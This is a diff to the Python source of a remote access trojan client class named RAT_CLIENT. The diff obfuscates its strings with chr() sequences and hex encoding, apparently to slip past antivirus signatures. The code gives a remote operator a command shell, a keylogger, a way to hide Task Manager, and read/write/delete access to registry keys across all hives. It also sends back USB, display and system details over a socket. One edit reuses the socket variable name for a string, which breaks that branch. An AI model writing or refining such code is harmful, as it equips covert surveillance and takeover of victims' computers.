@@ -40,15 +40,17 @@ class RAT_CLIENT:
         s.send(sending.encode())
     
     def errorsend(self):
-        output = bytearray("no output", encoding='utf8')
+        output_string = chr(110) + chr(111) + " " + chr(111) + chr(117) + chr(116) + chr(112) + chr(117) + chr(116)
+        output = bytearray(output_string, encoding='utf8')
         for i in range(len(output)):
             output[i] ^= 0x41
         s.send(output)
-    
+        
     def keylogger(self):
         def on_press(key):
             if klgr == True:
-                with open('keylogs.txt', 'a') as f:
+                filename = chr(107) + chr(101) + chr(121) + chr(108) + chr(111) + chr(103) + chr(115) + "." + chr(116) + chr(120) + chr(116)
+                with open(filename, 'a') as f:
                     f.write(f'{key}')
                     f.close()
 
@@ -59,25 +61,10 @@ class RAT_CLIENT:
         if ctypes.windll.shell32.IsUserAnAdmin() == 1:
             while (1):
                 if block == True:
-                    hwnd = user32.FindWindowW(0, "Task Manager")
+                    task_manager_str = bytes.fromhex('5461736b204d616e61676572').decode('utf-8')
+                    hwnd = user32.FindWindowW(0, task_manager_str)
                     user32.ShowWindow(hwnd, 0)
                     ctypes.windll.kernel32.Sleep(500)
-    
-    def disable_all(self):
-        while True:
-            user32.BlockInput(True)
-    
-    def disable_mouse(self):
-        mouse = Controller()
-        t_end = time.time() + 3600*24*11
-        while time.time() < t_end and mousedbl == True:
-            mouse.position = (0, 0)
-    
-    def disable_keyboard(self):
-        for i in range(150):
-            if kbrd == True:
-                keyboard.block_key(i)
-        time.sleep(999999)
     
     def execute(self):
         while True:
@@ -86,15 +73,21 @@ class RAT_CLIENT:
             if command == 'tjhpq':
                 while 1:
                     command = s.recv(1024).decode()
-                    if command.lower() == 'exit' :
+        
+                    exit_command = chr(101) + chr(120) + chr(105) + chr(116)
+                    if command.lower() == exit_command:
                         break
-                    if command == 'cd':
+                    
+                    cd_command = chr(99) + chr(100)
+                    if command == cd_command:
                         os.chdir(command[3:].decode('utf-8'))
                         dir = os.getcwd()
                         dir1 = str(dir)
                         s.send(dir1.encode())
+                    
                     output = subprocess.getoutput(command)
                     s.send(output.encode())
+                    
                     if not output:
                         self.errorsend()
             
@@ -103,88 +96,144 @@ class RAT_CLIENT:
                 root = s.recv(1024).decode()
                 key2 = s.recv(1024).decode()
                 value = s.recv(1024).decode()
+                hkey_current_user = chr(72) + chr(75) + chr(69) + chr(89) + chr(95) + chr(67) + chr(85) + chr(82) + chr(82) + chr(69) + chr(78) + chr(84) + chr(95) + chr(85) + chr(83) + chr(69) + chr(82)
+                hkey_classes_root = chr(72) + chr(75) + chr(69) + chr(89) + chr(95) + chr(67) + chr(76) + chr(65) + chr(83) + chr(83) + chr(69) + chr(83) + chr(95) + chr(82) + chr(79) + chr(79) + chr(84)
+                hkey_local_machine = chr(72) + chr(75) + chr(69) + chr(89) + chr(95) + chr(76) + chr(79) + chr(67) + chr(65) + chr(76) + chr(95) + chr(77) + chr(65) + chr(67) + chr(72) + chr(73) + chr(78) + chr(69)
+                hkey_users = chr(72) + chr(75) + chr(69) + chr(89) + chr(95) + chr(85) + chr(83) + chr(69) + chr(82) + chr(83)
+                hkey_current_config = chr(72) + chr(75) + chr(69) + chr(89) + chr(95) + chr(67) + chr(85) + chr(82) + chr(82) + chr(69) + chr(78) + chr(84) + chr(95) + chr(67) + chr(79) + chr(78) + chr(70) + chr(73) + chr(71)
                 try:
-                    if const == 'HKEY_CURRENT_USER':
+                    if const == hkey_current_user:
                         key = OpenKey(HKEY_CURRENT_USER, root, 0, KEY_ALL_ACCESS)
                         SetValueEx(key, key2, 0, REG_SZ, str(value))
                         CloseKey(key)
-                    if const == 'HKEY_CLASSES_ROOT':
+                    if const == hkey_classes_root:
                         key = OpenKey(HKEY_CLASSES_ROOT, root, 0, KEY_ALL_ACCESS)
                         SetValueEx(key, key2, 0, REG_SZ, str(value))
                         CloseKey(key)
-                    if const == 'HKEY_LOCAL_MACHINE':
+                    if const == hkey_local_machine:
                         key = OpenKey(HKEY_LOCAL_MACHINE, root, 0, KEY_ALL_ACCESS)
                         SetValueEx(key, key2, 0, REG_SZ, str(value))
                         CloseKey(key)
-                    if const == 'HKEY_USERS':
+                    if const == hkey_users:
                         key = OpenKey(HKEY_USERS, root, 0, KEY_ALL_ACCESS)
                         SetValueEx(key, key2, 0, REG_SZ, str(value))
                         CloseKey(key)
-                    if const == 'HKEY_CLASSES_ROOT':
-                        key = OpenKey(HKEY_CLASSES_ROOT, root, 0, KEY_ALL_ACCESS)
-                        SetValueEx(key, key2, 0, REG_SZ, str(value))
-                        CloseKey(key)
-                    if const == 'HKEY_CURRENT_CONFIG':
+                    if const == hkey_current_config:
                         key = OpenKey(HKEY_CURRENT_CONFIG, root, 0, KEY_ALL_ACCESS)
                         SetValueEx(key, key2, 0, REG_SZ, str(value))
                         CloseKey(key)
-                    s.send("Value is set".encode())
+                    value_is_set = chr(86) + chr(97) + chr(108) + chr(117) + chr(101) + " " + chr(105) + chr(115) + " " + chr(115) + chr(101) + chr(116)
+                    s.send(value_is_set.encode())
                 except:
-                    s.send("Impossible to create key".encode())
-            
+                    error_msg = chr(73) + chr(109) + chr(112) + chr(111) + chr(115) + chr(115) + chr(105) + chr(98) + chr(108) + chr(101) + " " + chr(116) + chr(111) + " " + chr(99) + chr(114) + chr(101) + chr(97) + chr(116) + chr(101) + " " + chr(107) + chr(101) + chr(121)
+                    s.send(error_msg.encode())
+
             elif command == 'egooje':
                 const = s.recv(1024).decode()
                 root = s.recv(1024).decode()
+                hkey_current_user = chr(72) + chr(75) + chr(69) + chr(89) + chr(95) + chr(67) + chr(85) + chr(82) + chr(82) + chr(69) + chr(78) + chr(84) + chr(95) + chr(85) + chr(83) + chr(69) + chr(82)
+                hkey_classes_root = chr(72) + chr(75) + chr(69) + chr(89) + chr(95) + chr(67) + chr(76) + chr(65) + chr(83) + chr(83) + chr(69) + chr(83) + chr(95) + chr(82) + chr(79) + chr(79) + chr(84)
+                hkey_local_machine = chr(72) + chr(75) + chr(69) + chr(89) + chr(95) + chr(76) + chr(79) + chr(67) + chr(65) + chr(76) + chr(95) + chr(77) + chr(65) + chr(67) + chr(72) + chr(73) + chr(78) + chr(69)
+                hkey_users = chr(72) + chr(75) + chr(69) + chr(89) + chr(95) + chr(85) + chr(83) + chr(69) + chr(82) + chr(83)
+                hkey_current_config = chr(72) + chr(75) + chr(69) + chr(89) + chr(95) + chr(67) + chr(85) + chr(82) + chr(82) + chr(69) + chr(78) + chr(84) + chr(95) + chr(67) + chr(79) + chr(78) + chr(70) + chr(73) + chr(71)
                 try:
-                    if const == 'HKEY_CURRENT_USER':
+                    if const == hkey_current_user:
                         DeleteKeyEx(HKEY_CURRENT_USER, root, KEY_ALL_ACCESS, 0)
-                    if const == 'HKEY_LOCAL_MACHINE':
+                    if const == hkey_local_machine:
                         DeleteKeyEx(HKEY_LOCAL_MACHINE, root, KEY_ALL_ACCESS, 0)
-                    if const == 'HKEY_USERS':
+                    if const == hkey_users:
                         DeleteKeyEx(HKEY_USERS, root, KEY_ALL_ACCESS, 0)
-                    if const == 'HKEY_CLASSES_ROOT':
+                    if const == hkey_classes_root:
                         DeleteKeyEx(HKEY_CLASSES_ROOT, root, KEY_ALL_ACCESS, 0)
-                    if const == 'HKEY_CURRENT_CONFIG':
+                    if const == hkey_current_config:
                         DeleteKeyEx(HKEY_CURRENT_CONFIG, root, KEY_ALL_ACCESS, 0)
-                    s.send("Key is deleted".encode())
+                    key_deleted = bytes.fromhex('4b65792069732064656c65746564').decode('utf-8')
+                    s.send(key_deleted.encode())
                 except:
-                    s.send("Impossible to delete key".encode())
+                    error_msg = bytes.fromhex('496d706f737369626c6520746f2064656c657465206b6579').decode('utf-8')
+                    s.send(error_msg.encode())
             
             elif command == 'dtheykrmh':
                 const = s.recv(1024).decode()
                 root = s.recv(1024).decode()
+                hkey_current_user = chr(72) + chr(75) + chr(69) + chr(89) + chr(95) + chr(67) + chr(85) + chr(82) + chr(82) + chr(69) + chr(78) + chr(84) + chr(95) + chr(85) + chr(83) + chr(69) + chr(82)
+                hkey_classes_root = chr(72) + chr(75) + chr(69) + chr(89) + chr(95) + chr(67) + chr(76) + chr(65) + chr(83) + chr(83) + chr(69) + chr(83) + chr(95) + chr(82) + chr(79) + chr(79) + chr(84)
+                hkey_local_machine = chr(72) + chr(75) + chr(69) + chr(89) + chr(95) + chr(76) + chr(79) + chr(67) + chr(65) + chr(76) + chr(95) + chr(77) + chr(65) + chr(67) + chr(72) + chr(73) + chr(78) + chr(69)
+                hkey_users = chr(72) + chr(75) + chr(69) + chr(89) + chr(95) + chr(85) + chr(83) + chr(69) + chr(82) + chr(83)
+                hkey_current_config = chr(72) + chr(75) + chr(69) + chr(89) + chr(95) + chr(67) + chr(85) + chr(82) + chr(82) + chr(69) + chr(78) + chr(84) + chr(95) + chr(67) + chr(79) + chr(78) + chr(70) + chr(73) + chr(71)
                 try:
-                    if const == 'HKEY_CURRENT_USER':
+                    if const == hkey_current_user:
                         CreateKeyEx(HKEY_CURRENT_USER, root, 0, KEY_ALL_ACCESS)
-                    if const == 'HKEY_LOCAL_MACHINE':
+                    if const == hkey_local_machine:
                         CreateKeyEx(HKEY_LOCAL_MACHINE, root, 0, KEY_ALL_ACCESS)
-                    if const == 'HKEY_USERS':
+                    if const == hkey_users:
                         CreateKeyEx(HKEY_USERS, root, 0, KEY_ALL_ACCESS)
-                    if const == 'HKEY_CLASSES_ROOT':
+                    if const == hkey_classes_root:
                         CreateKeyEx(HKEY_CLASSES_ROOT, root, 0, KEY_ALL_ACCESS)
-                    if const == 'HKEY_CURRENT_CONFIG':
+                    if const == hkey_current_config:
                         CreateKeyEx(HKEY_CURRENT_CONFIG, root, 0, KEY_ALL_ACCESS)
-                    s.send("Key is created".encode())
+                    key_created = bytes.fromhex('4b65792069732063726561746564').decode('utf-8')
+                    s.send(key_created.encode())
                 except:
-                    s.send("Impossible to create key".encode())
+                    error_msg = bytes.fromhex('496d706f737369626c6520746f20637265617465206b6579').decode('utf-8')
+                    s.send(error_msg.encode())
 
             elif command == 'vuehwocmac':
-                p = subprocess.check_output(["powershell.exe", "Get-PnpDevice -PresentOnly | Where-Object { $_.InstanceId -match '^USB' }"], encoding='utf-8')
+                powershell_cmd = (
+                    chr(112) + chr(111) + chr(119) + chr(101) + chr(114) + chr(115) + chr(104)
+                    + chr(101) + chr(108) + chr(108) + chr(46) + chr(101) + chr(120) + chr(101)
+                )
+                ps_command = (
+                    chr(71) + chr(101) + chr(116) + "-" + chr(80) + chr(110) + chr(112) + chr(68)
+                    + chr(101) + chr(118) + chr(105) + chr(99) + " " + "-PresentOnly | "
+                    + "Where-Object { $_.InstanceId -match '^USB' }"
+                )
+                p = subprocess.check_output([powershell_cmd, ps_command], encoding='utf-8')
                 s.send(p.encode())
-            
+    
             elif command == 'nqqmyuya':
-                p = subprocess.check_output(["powershell.exe", "Get-CimInstance -Namespace root\wmi -ClassName WmiMonitorBasicDisplayParams"], encoding='utf-8')
+                powershell_cmd = (
+                    chr(112) + chr(111) + chr(119) + chr(101) + chr(114) + chr(115) + chr(104)
+                    + chr(101) + chr(108) + chr(108) + chr(46) + chr(101) + chr(120) + chr(101)
+                )
+                ps_command = bytes.fromhex(
+                    '4765742d43696d496e7374616e6365202d4e616d65737061636520726f6f745c776d69202d436c6173734e616d6520576d694d6f6e69746f724261736963446973706c6179506172616d73'
+                ).decode('utf-8')
+                p = subprocess.check_output([powershell_cmd, ps_command], encoding='utf-8')
                 s.send(p.encode())
 
             elif command == 'tavmslv':
+                s = "S"
+                y = "y"
+                t = "t"
+                e = "e"
+                m = "m"
+                c = "c"
+                a = "a"
+                h = "h"
+                i = "i"
+                o = "o"
+                u = "u"
+                r = "r"
+                p = "p"
+                t = "t"
+                
+                system_str = s + y + s + t + e + m
+                architecture_str = a + r + c + h + i + t + e + c + t + u + r + e
+                computer_name_str = "Name of Computer"
+                processor_str = p + r + o + c + e + s + s + o + r
+                python_str = "Python"
+                java_str = "Java"
+                user_str = "User"
+                
                 sysinfo = str(f'''
-System: {platform.platform()} {platform.win32_edition()}
-Architecture: {platform.architecture()}
-Name of Computer: {platform.node()}
-Processor: {platform.processor()}
-Python: {platform.python_version()}
-Java: {platform.java_ver()}
-User: {os.getlogin()}
+            {system_str}: {platform.platform()} {platform.win32_edition()}
+            {architecture_str}: {platform.architecture()}
+            {computer_name_str}: {platform.node()}
+            {processor_str}: {platform.processor()}
+            {python_str}: {platform.python_version()}
+            {java_str}: {platform.java_ver()}
+            {user_str}: {os.getlogin()}
                 ''')
                 s.send(sysinfo.encode())
             
